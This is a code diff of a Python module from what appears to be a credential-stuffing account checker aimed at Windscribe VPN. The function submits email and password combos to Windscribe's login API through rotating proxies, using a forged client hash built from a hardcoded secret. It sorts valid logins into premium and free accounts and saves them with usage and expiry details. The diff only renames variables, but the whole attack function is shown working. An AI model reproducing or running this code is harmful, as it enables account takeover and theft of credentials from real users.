@@ -1,4 +1,4 @@
-from __main__ import checker
+from modules.variables import Checker
 from requests import get,post
 from modules.functions import bad_proxy, log,save,set_proxy
 from time import time
@@ -7,8 +7,9 @@ from hashlib import md5
 def check(email:str,password:str):
     username = email.split("@")[0] if "@" in email else email
     retries = 0
-    while retries != checker.retries:
+    while retries != Checker.retries:
         proxy = set_proxy()
+        proxy_set = set_proxy(proxy)
 
         unix = time()
         auth_hash = md5(f"952b4412f002315aa50751032fcaab03{unix}".encode()).hexdigest()
@@ -25,16 +26,16 @@ def check(email:str,password:str):
         }
         data = f"username={username}&password={password}&time={unix}&client_auth_hash={auth_hash}&session_type_id=2"
         try:
-            response = post("https://api.windscribe.com/Session?platform=firefox",headers=headers,data=data,proxies=set_proxy(proxy),timeout=checker.timeout) 
+            response = post("https://api.windscribe.com/Session?platform=firefox",headers=headers,data=data,proxies=proxy_set,timeout=Checker.timeout) 
             if response.status_code == 403 or "Could not log in with provided credentials" in response.text:
                 retries += 1
             elif "session_auth_hash" in response.text:
                 if "is_premium\": 0" in response.text:
-                    if not checker.cui:
+                    if not Checker.cui:
                         log("custom",username+":"+password,"Windscribe")
-                    save("Windscribe","custom",checker.time,username+":"+password+f" | Original Combo: {email}:{password}")
-                    checker.custom += 1
-                    checker.cpm += 1
+                    save("Windscribe","custom",Checker.time,username+":"+password+f" | Original Combo: {email}:{password}")
+                    Checker.custom += 1
+                    Checker.cpm += 1
                     return
                 elif "is_premium\": 1" in response.text:
                     djson = response.json()["data"]
@@ -42,19 +43,19 @@ def check(email:str,password:str):
                     username = djson["username"]
                     used = f'{(((djson["traffic_used"]/1024)/1024)/1024)}GB/{(((djson["traffic_max"]/1024)/1024)/1024)}GB'
                     expire = djson["premium_expiry_date"]
-                    if not checker.cui:
+                    if not Checker.cui:
                         log("good",username+":"+password,"Windscribe")
-                    save("Windscribe","good",checker.time,username+":"+password+f" | Email: {email} | Username: {username} | Used: {used} | Expire: {expire}")
-                    checker.good += 1
-                    checker.cpm += 1
+                    save("Windscribe","good",Checker.time,username+":"+password+f" | Email: {email} | Username: {username} | Used: {used} | Expire: {expire}")
+                    Checker.good += 1
+                    Checker.cpm += 1
                     return
             else:
                 raise
         except:
             bad_proxy(proxy)
-            checker.errors += 1
-    if not checker.cui:
+            Checker.errors += 1
+    if not Checker.cui:
         log("bad",email+":"+password,"Windscribe")
-    checker.bad += 1
-    checker.cpm += 1
+    Checker.bad += 1
+    Checker.cpm += 1
     return
